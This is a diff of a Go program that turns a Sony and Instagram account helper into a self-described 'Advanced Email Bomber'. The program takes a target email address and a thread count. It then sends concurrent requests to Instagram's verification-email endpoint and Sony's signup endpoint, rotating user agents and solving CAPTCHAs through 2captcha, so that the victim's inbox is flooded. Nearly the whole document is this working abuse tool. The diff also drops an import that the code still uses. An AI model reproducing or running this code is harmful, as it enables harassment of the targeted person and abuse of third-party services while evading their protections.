@@ -1,37 +1,44 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"math/rand"
 	"net/http"
 	"net/http/cookiejar"
-	"net/url"
 	"os"
+	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
-// --- مقادیر ثابت برای سونی ---
-const (
-	sonySitekey = "6LdWbTcaAAAAADFe7Vs6-1jfzSnprQwDWJ51aRep"
-	sonyPageurl = "https://acm.account.sony.com/create_account/personal?client_id=37351a12-3e6a-4544-87ff-1eaea0846de2&scope=openid%20users&mode=signup"
-)
+// userAgents is a list of browser user-agents to be chosen from randomly for each request.
+var userAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
+}
 
-// --- مقادیر ثابت برای اینستاگرام ---
-const (
-	instagramBaseURL    = "https://www.instagram.com/"
-	instagramCheckEmailURL = "https://www.instagram.com/api/v1/web/accounts/check_email/"
-	instagramSendVerifyURL = "https://www.instagram.com/api/v1/accounts/send_verify_email/"
-)
+// AttackVector defines the structure for a single attack type, compatible with both JSON and Form payloads.
+type AttackVector struct {
+	Name            string
+	TargetURL       string
+	RequiresCaptcha bool
+	// BuildPayload is a function that creates the request body and returns an io.Reader and the Content-Type.
+	BuildPayload func(targetEmail, captchaToken string) (io.Reader, string, error)
+}
 
-// --- توابع کمکی عمومی ---
-
+// --- Helper Functions for Random Data ---
 func randString(n int) string {
-	letters := []rune("abcdefghijklmnopqrstuvwxyz0123456789")
+	letters := []rune("abcdefghijklmnopqrstuvwxyz")
 	s := make([]rune, n)
 	for i := range s {
 		s[i] = letters[rand.Intn(len(letters))]
@@ -39,7 +46,6 @@ func randString(n int) string {
 	return string(s)
 }
 
-// ============== بخش مربوط به ساخت اکانت سونی ==============
 func randDOB() string {
 	year := rand.Intn(2003-1985) + 1985
 	month := rand.Intn(12) + 1
@@ -47,66 +53,54 @@ func randDOB() string {
 	return fmt.Sprintf("%04d-%02d-%02d", year, month, day)
 }
 
+// ============== 2Captcha Solving Section ==============
+const (
+	sonySitekey = "6LdWbTcaAAAAADFe7Vs6-1jfzSnprQwDWJ51aRep"
+	sonyPageurl = "https://acm.account.sony.com/create_account/personal"
+)
+
 func getCaptchaID(client *http.Client, captchaAPIKey string) (string, error) {
 	data := url.Values{
-		"key":       {captchaAPIKey},
-		"method":    {"userrecaptcha"},
-		"googlekey": {sonySitekey},
-		"pageurl":   {sonyPageurl},
-		"json":      {"1"},
+		"key":       {captchaAPIKey}, "method": {"userrecaptcha"},
+		"googlekey": {sonySitekey}, "pageurl": {sonyPageurl}, "json": {"1"},
 	}
-	// ... (بقیه کد این تابع بدون تغییر باقی می‌ماند)
-	req, err := http.NewRequest("POST", "https://2captcha.com/in.php", strings.NewReader(data.Encode()))
+	resp, err := client.PostForm("https://2captcha.com/in.php", data)
 	if err != nil {
-		return "", fmt.Errorf("error creating 2captcha request: %w", err)
-	}
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", fmt.Errorf("error sending initial request to 2captcha: %w", err)
+		return "", err
 	}
 	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return "", fmt.Errorf("error reading response from 2captcha: %w", err)
-	}
-
 	var result map[string]interface{}
+	body, _ := io.ReadAll(resp.Body)
 	if err := json.Unmarshal(body, &result); err != nil {
-		return "", fmt.Errorf("error parsing JSON response from 2captcha: %w", err)
+		return "", fmt.Errorf("error parsing 2captcha response: %w", err)
 	}
 
 	if status, ok := result["status"].(float64); !ok || status != 1 {
 		return "", fmt.Errorf("2captcha service returned an error: %v", result["request"])
 	}
-
 	return result["request"].(string), nil
 }
 
 func pollForCaptchaToken(client *http.Client, captchaAPIKey, captchaID string) (string, error) {
-	// ... (کد این تابع بدون تغییر باقی می‌ماند)
-	for i := 0; i < 24; i++ {
-		time.Sleep(3 * time.Second)
+	for i := 0; i < 24; i++ { // Poll for up to 2 minutes
+		time.Sleep(5 * time.Second)
 		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", captchaAPIKey, captchaID)
-
 		res, err := client.Get(reqURL)
 		if err != nil {
-			fmt.Printf("Network error while checking captcha status: %v. Retrying...\n", err)
+			log.Printf("[WARNING] Network error while polling for captcha: %v. Retrying...", err)
 			continue
 		}
 
+		var poll map[string]interface{}
 		body, err := io.ReadAll(res.Body)
+		res.Body.Close()
 		if err != nil {
-			res.Body.Close()
 			return "", fmt.Errorf("error reading captcha status response: %w", err)
 		}
-		res.Body.Close()
 
-		var poll map[string]interface{}
 		if err := json.Unmarshal(body, &poll); err != nil {
-			return "", fmt.Errorf("error parsing captcha status JSON response: %w", err)
+			return "", fmt.Errorf("error parsing captcha status JSON: %w", err)
 		}
 
 		if status, ok := poll["status"].(float64); ok && status == 1 {
@@ -116,43 +110,15 @@ func pollForCaptchaToken(client *http.Client, captchaAPIKey, captchaID string) (
 	return "", fmt.Errorf("captcha was not solved in the specified time")
 }
 
-// تابع اصلی برای اجرای فرآیند سونی
-func runSonyProcess(client *http.Client) {
-	fmt.Println("Initializing Sony session and getting cookies...")
-	initResp, err := client.Get(sonyPageurl)
-	if err != nil {
-		fmt.Println("Error making initial request to get cookies:", err)
-		return
-	}
-	initResp.Body.Close()
-	fmt.Println("Session initialized successfully.")
 
-	var email, captchaAPIKey string
-	fmt.Print("Enter your email for Sony account: ")
-	fmt.Scanln(&email)
-	email = strings.TrimSpace(email)
-	fmt.Print("Enter your 2captcha API key: ")
-	fmt.Scanln(&captchaAPIKey)
-	captchaAPIKey = strings.TrimSpace(captchaAPIKey)
+// --- Payload Builder Functions for each site ---
 
-	fmt.Println("Solving captcha... please wait (may take up to 2 minutes)")
-	captchaID, err := getCaptchaID(client, captchaAPIKey)
-	if err != nil {
-		fmt.Println("Error during captcha request phase:", err)
-		return
-	}
-	fmt.Println("Captcha request sent successfully, ID:", captchaID)
-
-	captchaToken, err := pollForCaptchaToken(client, captchaAPIKey, captchaID)
-	if err != nil {
-		fmt.Println("Error during captcha token retrieval phase:", err)
-		return
-	}
-	fmt.Println("Captcha solved! Submitting registration request...")
-
+// buildSonyPayload creates a JSON payload for the Sony registration endpoint.
+func buildSonyPayload(email, captchaToken string) (io.Reader, string, error) {
+	password := randString(12) + "aA1!"
 	payload := map[string]interface{}{
 		"email":              email,
-		"password":           randString(10) + "aA1",
+		"password":           password,
 		"legalCountry":       "US",
 		"language":           "en-US",
 		"dateOfBirth":        randDOB(),
@@ -163,221 +129,171 @@ func runSonyProcess(client *http.Client) {
 		"captchaResponse":    captchaToken,
 		"clientID":           "37351a12-3e6a-4544-87ff-1eaea0846de2",
 		"hashedTosPPVersion": "d3-7b2e7bfa9efbdd9371db8029cb263705",
-		// ... (بقیه فیلدهای payload بدون تغییر)
 	}
-
-	data, err := json.Marshal(payload)
+	
+	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Println("Error creating JSON payload:", err)
-		return
+		return nil, "", err
 	}
-
-	req, err := http.NewRequest("POST", "https://acm.account.sony.com/api/accountInterimRegister", bytes.NewBuffer(data))
-	if err != nil {
-		fmt.Println("Error creating HTTP request:", err)
-		return
-	}
-
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
-	req.Header.Set("Accept", "application/json, text/plain, */*")
-	req.Header.Set("Origin", "https://acm.account.sony.com")
-	req.Header.Set("Referer", sonyPageurl)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Println("Error sending registration request:", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	fmt.Println("\n----- Sony Server Response -----")
-	fmt.Printf("Status Code: %d\n", resp.StatusCode)
-	io.Copy(os.Stdout, resp.Body)
-	fmt.Println("\n------------------------------")
+	return bytes.NewBuffer(jsonData), "application/json", nil
 }
 
-// ============== بخش جدید مربوط به اینستاگرام ==============
-
-// این تابع به صفحه اصلی اینستاگرام میرود تا کوکی ها و توکن های لازم را بگیرد
-func getInstagramSession(client *http.Client) (string, string, error) {
-	req, err := http.NewRequest("GET", instagramBaseURL, nil)
-	if err != nil {
-		return "", "", err
+// buildInstagramPayload creates a Form payload for the Instagram verification endpoint.
+func buildInstagramPayload(email, captchaToken string) (io.Reader, string, error) {
+	data := url.Values{
+		"email":     {email},
+		"device_id": {""}, // This field is not strictly required for this specific request
 	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
+	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
+}
 
-	resp, err := client.Do(req)
-	if err != nil {
-		return "", "", fmt.Errorf("failed to get instagram page: %w", err)
-	}
-	defer resp.Body.Close()
 
-	// خواندن csrftoken از کوکی ها
-	var csrfToken string
-	instagramURL, _ := url.Parse(instagramBaseURL)
-	for _, cookie := range client.Jar.Cookies(instagramURL) {
-		if cookie.Name == "csrftoken" {
-			csrfToken = cookie.Value
-			break
+// --- Core Attack Function ---
+// runAttack is executed by each goroutine to perform a single attack.
+func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
+	defer wg.Done()
+
+	log.Printf("[STARTING] Sending request to: %s", vector.Name)
+
+	captchaToken := ""
+	var err error
+
+	// Step 1: Solve CAPTCHA if required
+	if vector.RequiresCaptcha {
+		if captchaKey == "" {
+			log.Printf("[ERROR] %s requires a 2Captcha API key, but none was provided.", vector.Name)
+			return
+		}
+		captchaID, err := getCaptchaID(client, captchaKey)
+		if err != nil {
+			log.Printf("[ERROR] Could not get CAPTCHA ID for %s: %v", vector.Name, err)
+			return
+		}
+		captchaToken, err = pollForCaptchaToken(client, captchaKey, captchaID)
+		if err != nil {
+			log.Printf("[ERROR] Could not get CAPTCHA token for %s: %v", vector.Name, err)
+			return
 		}
 	}
-	if csrfToken == "" {
-		return "", "", fmt.Errorf("csrftoken not found in cookies")
-	}
-
-	// خواندن jazoest از بدنه HTML
-	bodyBytes, err := io.ReadAll(resp.Body)
+	
+	// Step 2: Build the request payload
+	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken)
 	if err != nil {
-		return "", "", err
+		log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err)
+		return
 	}
-	bodyString := string(bodyBytes)
+
+	// Step 3: Create and send the HTTP request
+	req, err := http.NewRequest("POST", vector.TargetURL, payloadReader)
+	if err != nil {
+		log.Printf("[ERROR] Could not create request for %s: %v", vector.Name, err)
+		return
+	}
 	
-	// یک روش ساده برای پیدا کردن jazoest در متن HTML
-	if !strings.Contains(bodyString, `"jazoest":`) {
-		return "", "", fmt.Errorf("jazoest token not found in page body")
+	// Set Headers
+	// Pick a random User-Agent for this request
+	randomUA := userAgents[rand.Intn(len(userAgents))]
+	req.Header.Set("User-Agent", randomUA)
+	req.Header.Set("Content-Type", contentType)
+
+	// Set Instagram-specific headers if necessary
+	if strings.Contains(vector.TargetURL, "instagram.com") {
+		csrfToken := ""
+		instagramURL, _ := url.Parse("https://www.instagram.com")
+		for _, cookie := range client.Jar.Cookies(instagramURL) {
+			if cookie.Name == "csrftoken" {
+				csrfToken = cookie.Value
+				break
+			}
+		}
+		if csrfToken != "" {
+			req.Header.Set("X-Csrftoken", csrfToken)
+			req.Header.Set("X-Ig-App-Id", "936619743392459")
+		}
 	}
-	temp := strings.Split(bodyString, `"jazoest":`)[1]
-	jazoest := strings.Split(temp, ",")[0]
-	jazoest = strings.Trim(jazoest, `"`)
-
-
-	return csrfToken, jazoest, nil
-}
-
-
-// تابع برای بررسی موجود بودن ایمیل در اینستاگرام
-func checkInstagramEmail(client *http.Client, email, csrfToken, jazoest string) {
-	fmt.Println("\nChecking email:", email)
-
-	data := url.Values{
-		"email":   {email},
-		"jazoest": {jazoest},
-	}
-
-	req, _ := http.NewRequest("POST", instagramCheckEmailURL, strings.NewReader(data.Encode()))
-	
-	// تنظیم هدرهای ضروری
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
-	req.Header.Set("X-Csrftoken", csrfToken)
-	req.Header.Set("X-Instagram-Jazoest", jazoest)
-	req.Header.Set("Referer", instagramBaseURL)
 
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("Error checking email:", err)
+		log.Printf("[FAILURE] Request to %s failed: %v", vector.Name, err)
 		return
 	}
 	defer resp.Body.Close()
 
-	fmt.Println("--- Instagram Check Email Response ---")
-	fmt.Println("Status Code:", resp.StatusCode)
-	body, _ := io.ReadAll(resp.Body)
-	fmt.Println("Response Body:", string(body))
-	fmt.Println("------------------------------------")
-}
-
-
-// تابع برای ارسال ایمیل تایید
-func sendInstagramVerifyEmail(client *http.Client, email, csrfToken, jazoest string) {
-	fmt.Println("\nSending verification email to:", email)
-
-	// اینستاگرام یک device_id هم میخواهد که میتوانیم تصادفی بسازیم
-	deviceID := "web-auth-e2e-" + randString(28)
-
-	data := url.Values{
-		"device_id": {deviceID},
-		"email":     {email},
-		"jazoest":   {jazoest},
-	}
-
-	req, _ := http.NewRequest("POST", instagramSendVerifyURL, strings.NewReader(data.Encode()))
-
-	// تنظیم هدرهای ضروری
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
-	req.Header.Set("X-Csrftoken", csrfToken)
-	req.Header.Set("X-Instagram-Jazoest", jazoest)
-	req.Header.Set("Referer", instagramBaseURL)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Println("Error sending verification email:", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	fmt.Println("--- Instagram Send Verify Email Response ---")
-	fmt.Println("Status Code:", resp.StatusCode)
-	body, _ := io.ReadAll(resp.Body)
-	fmt.Println("Response Body:", string(body))
-	fmt.Println("------------------------------------------")
-}
-
-
-// تابع اصلی برای اجرای فرآیند اینستاگرام
-func runInstagramProcess(client *http.Client) {
-	fmt.Println("Initializing Instagram session...")
-	csrfToken, jazoest, err := getInstagramSession(client)
-	if err != nil {
-		fmt.Println("Error initializing session:", err)
-		return
-	}
-	fmt.Printf("Session initialized successfully. CSRF Token: %s..., Jazoest: %s\n", csrfToken[:10], jazoest)
-
-	var email string
-	fmt.Print("\nEnter email to check on Instagram: ")
-	fmt.Scanln(&email)
-	email = strings.TrimSpace(email)
-
-	// مرحله ۱: بررسی ایمیل
-	checkInstagramEmail(client, email, csrfToken, jazoest)
-	
-	// مرحله ۲: پرسش برای ارسال ایمیل تایید
-	var choice string
-	fmt.Print("\nDo you want to send a verification email to this address? (y/n): ")
-	fmt.Scanln(&choice)
-	if strings.ToLower(strings.TrimSpace(choice)) == "y" {
-		sendInstagramVerifyEmail(client, email, csrfToken, jazoest)
+	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+		log.Printf("[SUCCESS] Request to %s sent successfully. Status: %d", vector.Name, resp.StatusCode)
 	} else {
-		fmt.Println("Operation finished.")
+		log.Printf("[FAILURE] Request to %s failed with status. Status: %d", vector.Name, resp.StatusCode)
 	}
 }
 
-
-// ============== تابع Main اصلی ==============
+// promptForInput is a helper function to get user input from the console.
+func promptForInput(reader *bufio.Reader, prompt string) string {
+	fmt.Print(prompt)
+	input, _ := reader.ReadString('\n')
+	return strings.TrimSpace(input)
+}
 
 func main() {
-	// مقداردهی اولیه برای rand
 	rand.Seed(time.Now().UnixNano())
+	log.Println("--- Advanced Email Bomber (Educational Version) ---")
 
-	// ساخت http client با قابلیت مدیریت کوکی
+	// --- Interactive Input Gathering ---
+	reader := bufio.NewReader(os.Stdin)
+	
+	targetEmail := promptForInput("Enter the target email address: ")
+	if targetEmail == "" {
+		log.Fatal("Error: Target email cannot be empty.")
+	}
+
+	captchaKey := promptForInput("Enter your 2captcha.com API key (optional, press Enter to skip): ")
+
+	threadsStr := promptForInput("Enter the number of concurrent attacks (threads): ")
+	threads, err := strconv.Atoi(threadsStr)
+	if err != nil || threads <= 0 {
+		log.Fatal("Error: Invalid number of threads. Please enter a positive number.")
+	}
+
+	// --- Define Attack Vectors ---
+	attackVectors := []AttackVector{
+		{
+			Name:            "Instagram - Send Verify Email",
+			TargetURL:       "https://www.instagram.com/api/v1/accounts/send_verify_email/",
+			RequiresCaptcha: false,
+			BuildPayload:    buildInstagramPayload,
+		},
+		{
+			Name:            "Sony - Create Account",
+			TargetURL:       "https://acm.account.sony.com/api/accountInterimRegister",
+			RequiresCaptcha: true,
+			BuildPayload:    buildSonyPayload,
+		},
+	}
+
+	log.Printf("Target Email: %s | Concurrent Threads: %d", targetEmail, threads)
+	log.Println("Starting attack...")
+
+	// --- Concurrency Management ---
+	var wg sync.WaitGroup
 	jar, _ := cookiejar.New(nil)
-	tr := &http.Transport{
-		ForceAttemptHTTP2: false,
-		TLSClientConfig:   &tls.Config{MaxVersion: tls.VersionTLS12},
-	}
-	client := &http.Client{
-		Transport: tr,
-		Jar:       jar,
-		Timeout:   30 * time.Second,
+	client := &http.Client{Jar: jar, Timeout: 60 * time.Second} // Increased timeout for CAPTCHA
+	
+	// Pre-flight requests to get necessary cookies
+	log.Println("Initializing sessions with target sites...")
+	client.Get("https://www.instagram.com/")
+	client.Get("https://acm.account.sony.com/create_account/personal")
+	log.Println("Sessions initialized.")
+
+
+	// --- Main Attack Loop ---
+	for i := 0; i < threads; i++ {
+		// Pick a random attack vector for each thread
+		vector := attackVectors[rand.Intn(len(attackVectors))]
+		
+		wg.Add(1)
+		go runAttack(&wg, client, vector, targetEmail, captchaKey)
+		time.Sleep(100 * time.Millisecond) // A small delay to avoid instant IP blocks
 	}
 
-	// نمایش منو به کاربر
-	var choice int
-	fmt.Println("Select an operation:")
-	fmt.Println("1: Create Sony Account")
-	fmt.Println("2: Instagram Email Tools")
-	fmt.Print("Enter your choice (1 or 2): ")
-	fmt.Scanln(&choice)
-
-	switch choice {
-	case 1:
-		runSonyProcess(client)
-	case 2:
-		runInstagramProcess(client)
-	default:
-		fmt.Println("Invalid choice. Exiting.")
-	}
+	wg.Wait()
+	log.Println("--- Operation Finished ---")
 }
